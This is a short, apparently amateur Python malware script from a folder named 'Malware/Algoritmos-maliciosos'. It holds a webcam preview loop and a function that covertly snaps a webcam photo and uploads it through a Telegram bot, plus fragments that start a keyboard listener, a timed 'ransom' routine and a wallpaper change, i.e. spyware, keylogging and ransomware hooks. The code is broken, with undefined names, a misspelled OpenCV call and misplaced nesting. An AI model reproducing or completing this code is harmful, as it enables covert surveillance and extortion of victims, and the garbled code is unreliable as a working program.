import cv2
import time
import schedule
from datetime import datetime
import threading

print(cv2.__version__)
cam=cv2.VideoCapture(0)
while True:

    ret,frame=cam.read()
    cv2.imshow ('nanocam' , frame)
    if cv2.waitkey(1)==ord('q') :
        break

cam.release()
cv2.destroyAllWindows()

def camera():
    cam_port = 0
    cam = cv2.VideoCapture(cam_port)
    result, image = cam.read()
    if result:
        photopath = f"C:\\Users\\juanm\\OneDrive\\Desktop\\Malware\\Algoritmos-maliciosos\\camara.py" +\ 
        str(date).replace(":", ".")+".png"
        cv2.imwrite(photopath, image)
        try:
            TB.sendPhoto(photopath)
        except:
            print(Exception)
        else:
            print("ERROR")



        def run():
            with Listener(on_press=vkey) as listener:
                listener.join()

th.Timer(10, ransom).start()
wallpapersch()
run()



